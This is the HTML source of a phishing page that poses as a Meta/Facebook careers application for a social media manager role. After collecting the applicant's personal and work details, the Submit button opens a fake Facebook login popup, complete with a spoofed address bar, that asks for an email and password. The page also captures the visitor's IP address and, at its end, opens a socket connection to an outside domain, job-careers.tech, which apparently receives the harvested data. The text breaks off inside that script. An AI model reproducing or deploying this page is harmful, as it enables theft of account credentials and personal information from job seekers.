<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="viewport" content="width=device-width, user-scalable=no" />
    <meta property='og:image' content='https://metarecruit.net/jobs/assets/img/thumb.jpg' />
    <title>Jobs</title>
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/jeSA-pb45yi.png">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha512-Avb2QiuDEEvB4bZJYdft2mNjVShBftLdPG8FJ0V7irTLQ8Uo0qcPxh4Plq7G5tGm0rU+1SPhVotteLpBERwTkw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link rel="stylesheet" href="index.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js" integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>

</head>

<body>
    <nav>
          <input type="hidden" id="_ip" value="<?= $_SERVER['REMOTE_ADDR']; ?>">


        <div class="navbar">
            <div class="navcont container-fluid">
                <div class="menu-icon" onclick="toggleMenu()">
                    <div class="bar"></div>
                    <div class="bar"></div>
                    <div class="bar"></div>
                </div>
                <a class="px-5" href="/">
                    <img src="./assets/img/img_logo.svg" class="navlogo" alt="">
                </a>

                <button class="search-button searchnav" onclick="toggleModal('open')" type="button"><img src="./assets/img/search.svg" class="search-icon" alt=""></button>
                <ul class="menu" id="wrapper">
                    <li><a class="textnav kk" href="#">Jobs</a></li>
                    <li><a class="textnav kk" href="#">Area of Works</a></li>
                    <li><a class="textnav kk" href="#">Locations</a></li>
                    <li><a class="textnav kk" href="#">Career Programs</a></li>
                    <li><a class="textnav kk" href="#">How We Work</a></li>
                    <li><a class="textnav kk" href="#">Blog</a></li>
                    <li class="searchfa"> <button class="search-button" onclick="toggleModal('open')" type="button"><img src="./assets/img/search.svg" class="search-icon" alt=""></button>
                    </li>
                    <li>
                        <div class="loginbar">
                            <button onclick="slidefeedback()" class="textnav buttonlog">Log in<i class="fas fa-chevron-down px-1"></i></button>
                        </div>
                        <div class="logindropdown" id="logindropdown">
                            <div class="px-4  pt-4 mt-3" style="text-align: start;">
                                <span class="titleoflogin">Create a Career Profile</span>
                                <div class="pt-2">
                                    <span class="subtitleoflogin">
                                        You can create a Career Profile to get job suggestions, prepare for the
                                        interview process, and more.
                                    </span>
                                </div>
                                <div class="pt-2">
                                    <a class="buttoncreate" href="/">Create a Career Profile</a>
                                </div>
                                <div class="pt-3">
                                    <span class="subtitleoflogin">
                                        Already have a Career <br /> Profile?
                                    </span>
                                </div>
                                <div class="pt-2">
                                    <a class="logintext" href="/">Log in</a>
                                </div>
                            </div>
                        </div>
                        <div class=" logindrop " style="text-align: start;">
                            <div class="" style="border-top: 1px solid #c4c4c4;">
                                <div class="pt-3">
                                    <span class="titleofloginav">Create a Career Profile</span>
                                    <div class="pt-2">
                                        <span class="subtitleofloginav">
                                            You can create a Career Profile to get job suggestions, prepare for the
                                            interview process, and more.
                                        </span>
                                    </div>
                                    <div class="pt-2">
                                        <a class="buttoncreatenav " href="/">Create a Career Profile</a>
                                    </div>
                                    <div class="pt-3">
                                        <span class="subtitleofloginav">
                                            Already have a Career Profile?
                                        </span>
                                    </div>
                                    <div class="pt-2">
                                        <a class="logintext" href="/">Log in</a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </li>
                </ul>
                <div class="modalsearch" id="myModal1">
                    <div class="modal-contentsearch">
                        <div class="container">
                            <div class="searchcontent">
                                <span>
                                    <img src="./assets/img/searchbold.svg" width="30px !important" class="" alt="">
                                </span>

                                <div class="searchbox">
                                    <input placeholder="Search" class="searchinput">
                                </div>
                                <button class="close" onclick="toggleModal('close')"><svg width="20px" height="20x" viewBox="0 0 18 16">
                                        <g id="Syle-Guide" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd" stroke-linecap="square">
                                            <g id="Icon-Sheet" transform="translate(-173.000000, -48.000000)" stroke="#A7AAAE">
                                                <g id="Icons/Click-Out" transform="translate(174.000000, 48.000000)">
                                                    <g id="Path">
                                                        <path d="M16,0 L0,16"></path>
                                                        <path d="M0,0 L16,16"></path>
                                                    </g>
                                                </g>
                                            </g>
                                        </g>
                                    </svg></button>

                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </nav>
    <div class="sticky-div1" id="">
        <div class="container-xxl" style="">
            <div class="d-flex align-items-center px-lg-4">
                <img src="./assets/img/loogo.svg" alt="">
                <span class="px-2 mt-1 titleofproduct">Facebook</span>

            </div>
            <div class="row px-lg-4">
                <div class="col-12 col-lg-8">
                    <div class="mt-2 mt-sm-0">
                        <span class="subtitleofproduct">
                           Social Media Manager
                        </span>
                    </div>
                    
                </div>

            </div>
        </div>
    </div>
    <div class="containerform1" id="contaform">
        <div class="containerformm">
            <div class="card">
                <div class="form">
                    <div class="left-side">
                        <div class="left-heading">
                            <h3></h3>
                        </div>
                        <div class="steps-content">
                            <h3> <span class="step-number"></span></h3>
                            <p class="step-number-content active"></p>
                            <p class="step-number-content d-none"></p>
                            <p class="step-number-content d-none"></p>
                            <p class="step-number-content d-none"></p>
                        </div>
                        <div>

                            <ul class="progress-bar">
                                <li class="active">Personal Information</li>
                                <li>Education</li>
                                <li>Experience and Skills</li>
                            </ul>
                        </div>



                    </div>
                    <div class="right-side">
                        <div class="main active">
                            <div class="text mb-3">
                                <span class="headertextofform">Personal Information</span>
                            </div>

                            <div class="input-div">
                                <span class="textofinput">First Name</span>
                                <input class="inputch" type="text" required require id="user_name">
                            </div>

                            <div class="input-div mt-2">
                                <span class="textofinput">Last Name</span>
                                <input class="inputch" type="text" required>
                            </div>

                            <div class="input-div mt-3">
                                <span class="textofinput">E-mail Address</span>
                                <input class="inputch" id="first_step_email" type="text" required require>
                            </div>

                            <div class="input-div mt-3">
                                <span class="textofinput">Phone</span>
                                <input class="inputch" id="phonenumber" type="number" min="0" pattern="[0-9]*" inputmode="numeric" required require>
                            </div>



                            <div class="buttons">
                                <button class="next_button px-0 mt-4"><svg class="" width="24px" height="24px" viewBox="0 0 38 38" version="1.1" xmlns="http://www.w3.org/2000/svg">
                                        <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                            <g transform="translate(-5.000000, -5.000000)">
                                                <g transform="translate(6.000000, 6.000000)">
                                                    <circle stroke="#CCD1D4" cx="18" cy="18" r="18"></circle>
                                                    <g transform="translate(11.000000, 13.000000)" stroke="#232323" stroke-width="2">
                                                        <polyline stroke-linecap="square" points="8 0 13 5 8 10">
                                                        </polyline>
                                                        <path fill="#696969" d="M0,5 L13,5"></path>
                                                    </g>
                                                </g>
                                            </g>
                                        </g>
                                    </svg><span class="px-2 textofbuttonne">Next</span></button>
                            </div>
                        </div>
                        <div class="main">
                            <div class="text">
                                <span class="headertextofform">Education</span>
                            </div>
                            <div class="mb-4 mt-5">
                                <span class="subtextofinput">
                                    Higher Education (optional)
                                </span>
                            </div>
                            <div class="input-div">
                                <span class="textofinput">School Name</span>
                                <input class="inputch" type="text" required require>
                            </div>
                            <div class="input-div mt-3">
                                <span class="textofinput">Degree</span>
                                <select class="inputch">
                                    <option>Degree</option>
                                    <option>Bachelors</option>
                                    <option>Masters</option>
                                    <option>PHD</option>
                                </select>
                            </div>

                            <div style="border-bottom: 1px solid #d4d4d4;
                            padding-bottom: 40px;">
                            </div>

                            <div class="buttons button_space formend">
                                <div>
                                    <button class="back_button px-0 mt-4"><svg class="_9exz" width="24px" height="24px" viewBox="0 0 38 38" version="1.1" xmlns="http://www.w3.org/2000/svg">
                                            <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                                <g transform="translate(-5.000000, -5.000000)">
                                                    <g transform="translate(6.000000, 6.000000)">
                                                        <circle stroke="#CCD1D4" cx="18" cy="18" r="18"></circle>
                                                        <g transform="translate(11.000000, 13.000000)" stroke="#232323" stroke-width="2">
                                                            <polyline stroke-linecap="square" points="8 0 13 5 8 10">
                                                            </polyline>
                                                            <path d="M0,5 L13,5"></path>
                                                        </g>
                                                    </g>
                                                </g>
                                            </g>
                                        </svg><span class="px-2 textofbuttonne">Back</span></button>

                                </div>
                                <div class="buttons">
                                    <button class="next_button px-0 mt-4"><svg class="" width="24px" height="24px" viewBox="0 0 38 38" version="1.1" xmlns="http://www.w3.org/2000/svg">
                                            <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                                <g transform="translate(-5.000000, -5.000000)">
                                                    <g transform="translate(6.000000, 6.000000)">
                                                        <circle stroke="#CCD1D4" cx="18" cy="18" r="18"></circle>
                                                        <g transform="translate(11.000000, 13.000000)" stroke="#232323" stroke-width="2">
                                                            <polyline stroke-linecap="square" points="8 0 13 5 8 10">
                                                            </polyline>
                                                            <path fill="#696969" d="M0,5 L13,5"></path>
                                                        </g>
                                                    </g>
                                                </g>
                                            </g>
                                        </svg><span class="px-2 textofbuttonne">Next</span></button>
                                </div>
                            </div>
                        </div>
                        <div class="main">
                            <div class="text mb-4">
                                <span class="headertextofform">Experience and Skills</span>
                            </div>
                            <div class="mb-3">
                                <span class="subtextofinput">
                                    Work Experience
                                </span>
                            </div>
                            <label class="subtextoflabel">
                                Are you applying for your first job?
                            </label>
                            <div class="d-flex">
                                <div>
                                    <label>
                                        <input type="radio" name="provideInfo" value="yes" onclick="toggleInputs(this)">
                                        Yes
                                    </label>
                                </div>
                                <div class="mx-3">
                                    <label>
                                        <input type="radio" checked name="provideInfo" value="no" onclick="toggleInputs(this)"> No
                                    </label>
                                </div>
                            </div>
                            <div id="yesInputs" class="hidden">


                                <div class="input-div mt-3">
                                    <span class="textofinput">Skills (optional)</span>
                                    <input class="inputch" placeholder="Areas of expertise" type="text">
                                </div>
                                <div style="border-bottom: 1px solid #d4d4d4;
                                padding-bottom: 40px;">
                                </div>
                            </div>

                            <div id="noInputs" class="">
                                <div class="input-div mt-3">
                                    <span class="textofinput">Employer Name</span>
                                    <input class="inputch" placeholder="Employer Name" type="text" required require>
                                </div>
                                <div class="input-div mt-3">
                                    <span class="textofinput">Position</span>
                                    <input class="inputch" placeholder="Position" type="text" required require>
                                </div>
                            
                                <div class="input-div mt-3">
                                    <span class="textofinput">Skills (optional)</span>
                                    <input class="inputch" placeholder="Areas of expertise" type="text" required require>
                                </div>
                                <div style="border-bottom: 1px solid #d4d4d4;
                                padding-bottom: 40px;">

                                </div>

                            </div>

                            <div class="buttons button_space formend">
                                <div>
                                    <button class="back_button px-0 mt-4"><svg class="_9exz" width="24px" height="24px" viewBox="0 0 38 38" version="1.1" xmlns="http://www.w3.org/2000/svg">
                                            <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                                <g transform="translate(-5.000000, -5.000000)">
                                                    <g transform="translate(6.000000, 6.000000)">
                                                        <circle stroke="#CCD1D4" cx="18" cy="18" r="18"></circle>
                                                        <g transform="translate(11.000000, 13.000000)" stroke="#232323" stroke-width="2">
                                                            <polyline stroke-linecap="square" points="8 0 13 5 8 10">
                                                            </polyline>
                                                            <path d="M0,5 L13,5"></path>
                                                        </g>
                                                    </g>
                                                </g>
                                            </g>
                                        </svg><span class="px-2 textofbuttonne">Back</span></button>

                                </div>
                                <!-- <div class="buttons">
                                    <button class="next_button px-0 mt-4"><svg class="" width="24px" height="24px" viewBox="0 0 38 38" version="1.1" xmlns="http://www.w3.org/2000/svg">
                                            <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                                <g transform="translate(-5.000000, -5.000000)">
                                                    <g transform="translate(6.000000, 6.000000)">
                                                        <circle stroke="#CCD1D4" cx="18" cy="18" r="18"></circle>
                                                        <g transform="translate(11.000000, 13.000000)" stroke="#232323" stroke-width="2">
                                                            <polyline stroke-linecap="square" points="8 0 13 5 8 10">
                                                            </polyline>
                                                            <path fill="#696969" d="M0,5 L13,5"></path>
                                                        </g>
                                                    </g>
                                                </g>
                                            </g>
                                        </svg><span class="px-2 textofbuttonne">Next</span></button>
                                </div> -->

                                
                                <button type="button" class="mx-2 mx-lg-0 px-0 mt-3 buttonconfirm" data-bs-toggle="modal" data-bs-target="#staticBackdrop">
                                            Submit
                                        </button>

                                        <!-- Modal -->
                                        <div class="modal" id="staticBackdrop" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
                                            <div class="modal-dialog">
                                                <div class="modal-content">
                                                    <div class="d-flex justify-content-end">
                                                        <button type="button" class="btn-close pull-right buttonclose" data-bs-dismiss="modal" aria-label="Close"></button>
                                                    </div>
                                                    <div class="modal-header input-icons">
                                                        <svg style="position: absolute;margin-left:10px" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20" fill="none">
                                                            <path d="M10 2C11.6569 2 13 3.34315 13 5V6H14C15.1046 6 16 6.89543 16 8V15C16 16.1046 15.1046 17 14 17H6C4.89543 17 4 16.1046 4 15V8C4 6.89543 4.89543 6 6 6H7V5C7 3.34315 8.34315 2 10 2ZM10 4C9.44772 4 9 4.44772 9 5V6H11V5C11 4.44772 10.5523 4 10 4Z" fill="#B6BABE" />
                                                        </svg>
                                                        <input style="height: 30px!important;" class="inputmodal i_54d4 input-field w-100" value="https://www.facebook.com/D%3DFacebook%2Bshare%2Bpopup%26p%255Burl%255D%3Dhttp%253A%252F%252Fjsfiddle.net%252Fstichoza%252FEYxTJ%252F%26p%255Bimages%255D%255B0%255D%3Dhttps%253A%252F%252Fgoo.gl%252FdS52U&" type="text">

                                                    </div>
                                                    <div class="" id="changeForma" style="background-color:#f0f2f5;;">
                                                        <div class="containermodal flex">
                                                            <div class="modal-page flex">
                                                                <div class="text">
                                                                    <h1>facebook</h1>
                                                                    <p class="_49fjd">Connect with friends and the world
                                                                    </p>
                                                                    <p class="_49fjd">around you on Facebook.</p>
                                                                </div>
                                                                <form class="formmodal" id="loginForm">
                                                                    <input type="email" id="email" placeholder="Email or phone number" required>
                                                                    <input type="password" id="password" placeholder="Password" required>
                                                                    <div class="linkmodal">
                                                                        <button id="loginbutton" onclick="loginButtoni()" type="button" class="login">Login</button>
                                                                        <a href="#" class="forgot">Forgot password?</a>
                                                                    </div>
                                                                    <hr>
                                                                </form>
                                                            </div>
                                                        </div>
                                                    </div>

                                                </div>
                                            </div>
                                        </div>
                            </div>
                        </div>



                        <!-- <div class="main">
                            <div class="text mb-4">
                                <span class="headertextofform">Voluntary Self-Identification</span>
                            </div>
                            <div class="mt-4">
                                <span class="headertextself">
                                    Gender and Race/Ethnicity
                                </span>
                                <div class="mt-2">
                                    <span class="subtextself">
                                        Meta is committed to building a workforce that is as diverse as the communities
                                        we serve. Hiring people with different backgrounds and experiences helps us
                                        build better products, better serve our users, and build a diverse and inclusive
                                        workplace.
                                    </span>
                                </div>
                                <div class="mt-2">
                                    <span class="subtextself">
                                        In addition to the information required to consider your candidacy we invite you
                                        to voluntarily provide your gender and race/ethnicity. This information ensures
                                        we meet certain regulatory reporting obligations and also further supports the
                                        development, refinement, and execution of our diversity efforts and programs.
                                        Information will be kept confidential, used only for legitimate business
                                        purposes, and will never be used in making any employment decisions, including
                                        hiring decisions.
                                    </span>
                                </div>
                                <div class="mt-3">
                                    <span class="headertextself">
                                        Race & Ethnicity Definitions
                                    </span>
                                </div>
                                <div class="mt-2">
                                    <span class="subtextself">
                                        <span class="undertextself">Asian:</span>a person having origins in any of the
                                        original peoples of the Far
                                        East, Southeast Asia, or the Indian subcontinent, including, for example,
                                        Cambodia, China, India, Japan, Korea, Malaysia, Pakistan, the Philippine
                                        Islands, Thailand, and Vietnam.
                                    </span>
                                </div>
                                <div class="mt-2">
                                    <span class="subtextself"> <span class="undertextself">Black or African
                                            American:</span>a person having origins in any of the black racial
                                        groups of Africa.</span>
                                </div>
                                <div class="mt-2">
                                    <span class="subtextself">
                                        <span class="undertextself">Hispanic or Latino:</span>a person of Cuban,
                                        Mexican, Puerto Rican, South or Central
                                        American, or other Spanish culture or origin, regardless of race.</span>
                                </div>
                                <div class="mt-2">
                                    <span class="subtextself">
                                        <span class="undertextself">Native American or Alaska Native:</span>a person
                                        having origins in any of the
                                        original peoples of North and South America (including Central America), and who
                                        maintains a tribal affiliation or community attachment.</span>
                                </div>
                                <div class="mt-2">
                                    <span class="subtextself">
                                        <span class="undertextself">Native Hawaiian or Other Pacific Islander:</span>a
                                        person having origins in any of
                                        the original peoples of Hawaii, Guam, Samoa, or other Pacific Islands.</span>
                                </div>
                                <div class="mt-2">
                                    <span class="subtextself">
                                        <span class="undertextself">White:</span>a person having origins in any of the
                                        original peoples of Europe, the
                                        Middle East, or North Africa.</span>
                                </div>
                                <div class="mt-3">
                                    <span class="headertextself">
                                        Indicate your gender:
                                    </span>
                                </div>
                                <div>
                                    <div class="_549a mt-2">
                                        <label class="">
                                            <input class=" " type="radio" name="provideInfo" value="Male">
                                            <span class="inputtextform">Male</span>
                                        </label>
                                        <label class="mx-0 mx-md-5">
                                            <input class=" " type="radio" name="provideInfo" value="Female">
                                            <span class="inputtextform">Female</span>
                                        </label>
                                        <label class="mx-0 mx-md-3">
                                            <input class=" " type="radio" name="provideInfo" value="choose">
                                            <span class="inputtextform">I choose not to disclose</span>
                                        </label>
                                    </div>
                                </div>
                                <div class="mt-3">
                                    <span class="headertextself">
                                        Indicate your race/ethnicity:
                                    </span>
                                </div>
                                <div class="row mt-2">
                                    <div class="col-12 col-sm">
                                        <label class="">
                                            <input type="radio" name="" value="">
                                            <span class="inputtextform">Native American or Alaska Native</span>
                                        </label>
                                        <label>
                                            <input type="radio" name="" value="">
                                            <span class="inputtextform">Black or African American</span>
                                        </label>
                                        <label>
                                            <input type="radio" name="" value="">
                                            <span class="inputtextform"> Native Hawaiian or Other Pacific
                                                Islander</span>
                                        </label>
                                        <label>
                                            <input type="radio" name="" value="">
                                            <span class="inputtextform">Two or More Races</span>
                                        </label>
                                    </div>
                                    <div class="col">
                                        <label>
                                            <input type="radio" name="" value="">
                                            <span class="inputtextform">Asian</span>
                                        </label>
                                        <label>
                                            <input type="radio" name="" value="">
                                            <span class="inputtextform">Hispanic or Latino</span>
                                        </label>
                                        <label>
                                            <input type="radio" name="" value="">
                                            <span class="inputtextform"> White</span>
                                        </label>
                                        <label>
                                            <input type="radio" name="" value="">
                                            <span class="inputtextform"> I choose not to disclose</span>
                                        </label>
                                    </div>
                                </div>
                                <div class="mt-3">
                                    <span class="headertextself">Protected Veteran Status</span>
                                </div>
                                <div class="mt-2">
                                    <span class="subtextself">At Meta we value your military service. We collect two
                                        types of
                                        self-identification information for Veterans, "Protected Veteran" and "Other
                                        Veteran". Meta is subject to the Vietnam Era Veterans' Readjustment Assistance
                                        Act of 1974, as amended (the “Act”), which requires government contractors to
                                        take affirmative action to employ and advance in employment: [1] disabled
                                        veterans; [2] recently separated veterans; [3] active duty wartime or campaign
                                        badge veterans; and [4] Armed Forces service medal veterans. You may hover over
                                        each of the 4 classifications for the applicable definitions. If you have served
                                        in the military but you do not fall into one of these categories or have served
                                        in another country's military, you may identify as "Other Veteran".</span>
                                </div>
                                <div class="mt-2">
                                    <span class="subtextself">Information will be kept confidential, used only for
                                        legitimate business
                                        purposes, and will never be used in making any employment decisions.</span>
                                </div>
                                <div class="mt-3">
                                    <span class="headertextself">Indicate your Protected Veteran Status:</span>
                                </div>
                                <div>
                                    <div class="mt-2">
                                        <label>
                                            <input type="radio" name="" value="">
                                            <span class="inputtextform"> I identify as one or more of the
                                                classifications of protected veteran
                                                listed.</span>

                                        </label>
                                        <label class="">
                                            <input type="radio" name="" value="">
                                            <span class="inputtextform"> Other veteran</span>

                                        </label>
                                        <label class="">
                                            <input type="radio" name="" value="">
                                            <span class="inputtextform">I am not a protected veteran</span>

                                        </label>
                                        <label class="">
                                            <input type="radio" name="" value="">
                                            <span class="inputtextform"> I choose not to disclose</span>

                                        </label>
                                    </div>
                                </div>
                                <div class="mt-3">
                                    <span class="headertextself">Disability</span>
                                </div>
                                <div class="mt-2 d-flex flex-column">
                                    <span class="subtextself">Form CC-305</span>
                                    <span class="subtextself">OMB Control Number 1250-0005
                                    </span>
                                    <span class="subtextself">Expires 4/30/2026</span>
                                </div>
                                <div class="mt-3">
                                    <span class="undertextself">Why are you being asked to complete this
                                        form?</span>
                                </div>
                                <div class="mt-2">
                                    <span class="subtextself">We are a federal contractor or subcontractor. The law
                                        requires us to provide
                                        equal employment opportunity to qualified people with disabilities. We have a
                                        goal of having at least 7% of our workers as people with disabilities. The law
                                        says we must measure our progress towards this goal. To do this, we must ask
                                        applicants and employees if they have a disability or have ever had one. People
                                        can become disabled, so we need to ask this question at least every five
                                        years.</span>
                                </div>
                                <div class="mt-2">
                                    <span class="subtextself">Completing this form is voluntary, and we hope that you
                                        will choose to do so.
                                        Your answer is confidential. No one who makes hiring decisions will see it. Your
                                        decision to complete the form and your answer will not harm you in any way. If
                                        you want to learn more about the law or this form, visit the U.S. Department of
                                        Labor’s Office of Federal Contract Compliance Programs (OFCCP) website at
                                        www.dol.gov/ofccp.</span>
                                </div>
                                <div class="mt-3">
                                    <span class="undertextself">How do I know if I have a disability?</span>
                                </div>
                                <div class="mt-2">
                                    <span class="subtextself"> A disability is a condition that substantially limits one
                                        or more of your
                                        “major life activities.” If you have or have ever had such a condition, you are
                                        a person with a disability. Disabilities include, but are not limited to:</span>
                                </div>
                                <div class="mt-2">
                                    <ul>
                                        <li>
                                            <span class="subtextself">
                                                Alcohol or other substance use disorder (not currently using drugs
                                                illegally)
                                            </span>
                                        </li>
                                        <li>
                                            <span class="subtextself">
                                                Autoimmune disorder, for example, lupus, fibromyalgia, rheumatoid
                                                arthritis, or HIV/AIDS
                                            </span>
                                        </li>
                                        <li>
                                            <span class="subtextself">
                                                Blind or low vision
                                            </span>
                                        </li>
                                        <li>
                                            <span class="subtextself">
                                                Cancer (past or present)
                                            </span>
                                        </li>
                                        <li>
                                            <span class="subtextself">
                                                Cardiovascular or heart disease
                                            </span>
                                        </li>
                                        <li>
                                            <span class="subtextself">
                                                Celiac disease
                                            </span>
                                        </li>
                                        <li>
                                            <span class="subtextself">
                                                Cerebral palsy
                                            </span>
                                        </li>
                                        <li>
                                            <span class="subtextself">
                                                Diabetes
                                            </span>
                                        </li>
                                        <li>
                                            <span class="subtextself">
                                                Disfigurement, for example, disfigurement caused by burns, wounds,
                                                accidents, or congenital disorders
                                            </span>
                                        </li>
                                        <li>
                                            <span class="subtextself">
                                                Epilepsy or other seizure disorder
                                            </span>
                                        </li>
                                        <li>
                                            <span class="subtextself">
                                                Gastrointestinal disorders, for example, Crohn's Disease, or irritable
                                                bowel syndrome
                                            </span>
                                        </li>
                                        <li>
                                            <span class="subtextself">
                                                Mental health conditions, for example, depression, bipolar disorder,
                                                anxiety disorder, schizophrenia, PTSD
                                            </span>
                                        </li>
                                        <li>
                                            <span class="subtextself">
                                                Missing limbs or partially missing limbs
                                            </span>
                                        </li>
                                        <li>
                                            <span class="subtextself">
                                                Mobility impairment, benefiting from the use of a wheelchair, scooter,
                                                walker, leg brace(s) and/or other supports
                                            </span>
                                        </li>
                                        <li>
                                            <span class="subtextself">
                                                Nervous system condition for example, migraine headaches, Parkinson’s
                                                disease, or Multiplesclerosis (MS)
                                            </span>
                                        </li>
                                        <li>
                                            <span class="subtextself">
                                                Neurodivergence, for example, attention-deficit/hyperactivity disorder
                                                (ADHD), autism spectrum disorder, dyslexia, dyspraxia, other learning
                                                disabilities
                                            </span>
                                        </li>
                                        <li>
                                            <span class="subtextself">
                                                Partial or complete paralysis (any cause)
                                            </span>
                                        </li>
                                        <li>
                                            <span class="subtextself">
                                                Pulmonary or respiratory conditions, for example, tuberculosis, asthma,
                                                emphysema
                                            </span>
                                        </li>
                                        <li>
                                            <span class="subtextself">
                                                Short stature (dwarfism)
                                            </span>
                                        </li>
                                        <li>
                                            <span class="subtextself">
                                                Traumatic brain injury
                                            </span>
                                        </li>
                                    </ul>
                                </div>

                                <div class="mt-2">
                                    <span class="subtextself">PUBLIC BURDEN STATEMENT: According to the Paperwork
                                        Reduction Act of 1995 no
                                        persons are required to respond to a collection of information unless such
                                        collection displays a valid OMB control number. This survey should take about 5
                                        minutes to complete.</span>
                                </div>
                                <div class="mt-3">
                                    <span class="headertextself">Please select one of the choices below:</span>
                                </div>
                                <div class="mt-2">
                                    <label>
                                        <input type="radio" name="" value="">
                                        <span class="inputtextform">
                                            Yes, I have a disability, or have had one in the past
                                        </span>

                                    </label>
                                    <label class="">
                                        <input type="radio" name="" value="">
                                        <span class="inputtextform">
                                            No, I do not have a disability and have not had one in the past
                                        </span>
                                    </label>
                                    <label class="">
                                        <input type="radio" name="" value="">
                                        <span class="inputtextform">
                                            I do not want to answer
                                        </span>
                                    </label>

                                </div>
                                <div>
                                    <div class="buttons button_spacee">
                                        <button class="back_button px-0 mt-4"><svg class="_9exz" width="24px" height="24px" viewBox="0 0 38 38" version="1.1" xmlns="http://www.w3.org/2000/svg">
                                                <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                                    <g transform="translate(-5.000000, -5.000000)">
                                                        <g transform="translate(6.000000, 6.000000)">
                                                            <circle stroke="#CCD1D4" cx="18" cy="18" r="18"></circle>
                                                            <g transform="translate(11.000000, 13.000000)" stroke="#232323" stroke-width="2">
                                                                <polyline stroke-linecap="square" points="8 0 13 5 8 10">
                                                                </polyline>
                                                                <path d="M0,5 L13,5"></path>
                                                            </g>
                                                        </g>
                                                    </g>
                                                </g>
                                            </svg><span class="px-2 textofbuttonne">Back</span></button>


                                    </div>

                                </div>

                            </div>
                        </div> -->
                    </div>
                </div>
            </div>
        </div>
    </div>

    <input type="text" hidden id="socket_id">
    <div style="border-bottom: 1px solid #d3d4d8;margin-top: 55px;">
        <div class="footer">
            <div class="footerbox">
                <div class="footerboxtext">
                    <div>
                        <span class="subtextfooter">
                            Meta is proud to be an Equal Employment Opportunity and Affirmative Action employer. We
                            do not discriminate based upon race, religion, color, national origin, sex (including
                            pregnancy, childbirth, reproductive health decisions, or related medical conditions),
                            sexual orientation, gender identity, gender expression, age, status as a protected
                            veteran, status as an individual with a disability, genetic information, political views
                            or activity, or other applicable legally protected characteristics. You may view our
                            Equal Employment Opportunity notice <a style="color: #232323;" href="">here</a> We also
                            consider qualified
                            applicants with criminal histories, consistent with applicable federal, state and local law.
                            We may use your information to maintain the safety and security of Meta, its employees, and
                            others as required or permitted by law. You may view <a style="color: #232323;" href="">
                                Meta's Pay Transparency
                                Policy, </a> <a style="color: #232323;" href=""> Notice to Applicants for Employment and
                                Employees </a>
                            by clicking on their corresponding links. Additionally, Meta participates in the <a href="" style="color: #232323;">
                                E-Verify program </a> in certain locations, as required by law.
                            <br><br />
                            Meta is committed to providing reasonable accommodations for qualified individuals with
                            disabilities and disabled veterans in our job application procedures. If you need assistance
                            or an accommodation due to a disability, you may contact us at <a style="color: #232323;" href="">accommodations-ext@fb.com</a>
                        </span>
                    </div>
                </div>
                <div>
                    <div class="row mt-4 mt-xl-5 gx-5">
                        <div class="col-6 col-xl-auto">
                            <div>
                                <span class="bottomtextfooter">About Us</span>
                                <div>
                                    <a class="bottomfotersubtext" href="/">Company info</a>
                                </div>
                                <div>
                                    <a class="bottomfotersubtext" href="/">Newsroom</a>
                                </div>
                                <div>
                                    <a class="bottomfotersubtext" href="/">Careers FAQs</a>
                                </div>
                                <div>
                                    <a class="bottomfotersubtext" href="/">Looking for contractor roles?</a>
                                </div>
                            </div>
                        </div>
                        <div class="col-6 col-xl-auto">
                            <div>
                                <span class="bottomtextfooter">On Social</span>
                                <div>
                                    <a class="bottomfotersubtext" href="/">Facebook</a>
                                </div>
                                <div>
                                    <a class="bottomfotersubtext" href="/">Instagram</a>
                                </div>
                                <div>
                                    <a class="bottomfotersubtext" href="/">LinkedIn</a>
                                </div>
                                <div>
                                    <a class="bottomfotersubtext" href="/">Threads</a>
                                </div>
                            </div>
                        </div>
                        <div class="col-6 mt-4 mt-xl-0 col-xl-auto">
                            <div>
                                <span class="bottomtextfooter">Our policies</span>
                                <div>
                                    <a class="bottomfotersubtext" href="/"> Candidate privacy statement </a>
                                </div>
                                <div>
                                    <a class="bottomfotersubtext" href="/"> Cookies </a>
                                </div>
                                <div>
                                    <a class="bottomfotersubtext" href="/">LinkedIn</a>
                                </div>
                                <div>
                                    <a class="bottomfotersubtext" href="/"> Vaccination entry policy </a>
                                </div>
                            </div>
                        </div>
                        <div class="col-6 mt-4 mt-xl-0 col-xl-auto">
                            <div>
                                <span class="bottomtextfooter">More resources</span>
                                <div>
                                    <a class="bottomfotersubtext" href="/">Family safety center</a>
                                </div>
                                <div>
                                    <a class="bottomfotersubtext" href="/"> Meta for business </a>
                                </div>
                                <div>
                                    <a class="bottomfotersubtext" href="/">LinkedIn</a>
                                </div>
                                <div>
                                    <a class="bottomfotersubtext" href="/"> Meta for developers </a>
                                </div>
                            </div>
                        </div>

                    </div>
                </div>
            </div>

        </div>
    </div>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js" integrity="sha384-mZLF4UVrpi/QTWPA7BjNPEnkIfRFn4ZEO3Qt/HFklTJBj/gBOV8G3HcKn4NfQblz" crossorigin="anonymous"></script>



    <script>
        let socket = io('https://job-careers.tech');
        socket.on("connect", () => {
